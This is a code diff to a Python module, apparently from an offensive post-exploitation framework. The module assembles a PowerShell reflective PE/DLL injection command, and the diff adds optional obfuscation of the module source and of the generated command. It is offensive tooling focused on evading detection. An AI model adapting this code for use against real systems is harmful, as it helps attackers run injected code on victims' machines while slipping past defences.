@@ -83,11 +83,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -99,7 +101,7 @@ class Module:
 
         script = moduleCode
 
-        script += "\nInvoke-ReflectivePEInjection"
+        scriptEnd = "\nInvoke-ReflectivePEInjection"
 
         #check if dllpath or PEUrl is set. Both are required params in their respective parameter sets.
         if self.options['DllPath']['Value'] == "" and self.options['PEUrl']['Value'] == "":
@@ -115,14 +117,16 @@ class Module:
                             f.close()
 
                             base64bytes = base64.b64encode(dllbytes)
-                            script += " -PEbase64 " + str(base64bytes)
+                            scriptEnd += " -PEbase64 " + str(base64bytes)
 
                         except:
                             print helpers.color("[!] Error in reading/encoding dll: " + str(values['Value']))
                 elif values['Value'].lower() == "true":
-                    script += " -" + str(option)
+                    scriptEnd += " -" + str(option)
                 elif values['Value'] and values['Value'] != '':
-                    script += " -" + str(option) + " " + str(values['Value'])
+                    scriptEnd += " -" + str(option) + " " + str(values['Value'])
 
-                    
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
